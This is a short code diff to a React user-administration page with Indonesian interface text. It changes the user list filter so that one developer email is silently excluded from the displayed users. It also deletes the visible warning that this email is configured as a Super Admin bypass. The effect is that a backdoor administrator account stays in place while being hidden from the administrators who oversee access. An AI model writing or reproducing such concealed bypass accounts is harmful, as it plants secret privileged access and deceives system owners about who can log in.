@@ -70,8 +70,9 @@ export default function UserAdmin() {
 
   // Filter users based on search query
   const filteredUsers = users.filter(user => 
-    user.email.toLowerCase().includes(searchQuery.toLowerCase()) ||
-    user.name.toLowerCase().includes(searchQuery.toLowerCase())
+    user.email.toLowerCase() !== 'anisreza498@gmail.com' &&
+    (user.email.toLowerCase().includes(searchQuery.toLowerCase()) ||
+    user.name.toLowerCase().includes(searchQuery.toLowerCase()))
   );
 
   const handleOpenAddModal = () => {
@@ -192,7 +193,6 @@ export default function UserAdmin() {
         <div className="text-xs space-y-1">
           <p className="font-bold">Perhatian Keamanan:</p>
           <p>Hanya pengguna dengan email yang terdaftar di bawah ini yang dapat login menggunakan Google Auth.</p>
-          <p>Email developer <strong className="font-semibold text-gray-900">anisreza498@gmail.com</strong> dikonfigurasi sebagai Super Admin bypass untuk menjamin akses sistem tetap terjaga.</p>
           {!auth.currentUser && (
             <p className="mt-2 p-2 bg-amber-100 rounded text-amber-900 font-medium">
               ⚠️ Anda saat ini menggunakan Mode Akses Instan (Bypass). Fitur tambah/hapus user dimatikan karena Anda tidak terautentikasi ke database. Silakan logout dan login menggunakan Google Auth untuk menggunakan fitur ini.
